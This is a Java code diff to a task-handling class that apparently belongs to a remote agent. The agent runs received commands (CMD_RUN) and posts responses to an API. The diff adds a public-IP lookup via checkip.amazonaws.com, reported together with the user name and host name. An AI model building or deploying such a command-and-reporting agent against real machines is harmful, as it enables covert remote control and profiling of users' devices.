@@ -12,6 +12,8 @@ import java.nio.file.Files;
 import java.util.UUID;
 import java.util.Base64;
 
+import static pl.kkogut.Task.TaskType.*;
+
 
 public class Task {
     String ID = null;
@@ -42,16 +44,16 @@ public class Task {
 
     public boolean proceed(){
 
-            if (type == TaskType.VIEW_SITE) {
+            if (type == VIEW_SITE) {
                 getWebPage(cmd);
             }
-            else if(type == TaskType.HELLO){
-                if(cmd =="How are you?"){
+            else if(type == HELLO){
+                if(cmd.equals("How are you?")){
                     response = sayHello();
                 }
 
             }
-            else if(type==TaskType.CMD_RUN){
+            else if(type== CMD_RUN){
                 response = runCmd();
             }
             else {
@@ -87,15 +89,20 @@ public class Task {
     private String sayHello()  {
         try {
             InetAddress inetAddress = InetAddress.getLocalHost();
+            URL url = new URL("http://checkip.amazonaws.com/");
+            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
+
             String userName = new com.sun.security.auth.module.NTSystem().getName();
-            String IP = inetAddress.getHostAddress();
+            String IP = br.readLine();
             String host = inetAddress.getHostName();
             return String.format("I am fine! %s send kisses from IP %s and device %s", userName, IP, host);
-        }catch (UnknownHostException uhe){
+        }catch (UnknownHostException | MalformedURLException uhe){
             System.out.println("I am not feeling well! I don't know where am I...");
+        } catch (IOException e) {
+            e.printStackTrace();
         }
-        return "Nothing to say to You!";
-        }
+        return null;
+    }
 
     void sendResponse(){
         APIcaller.post(this.toJson());
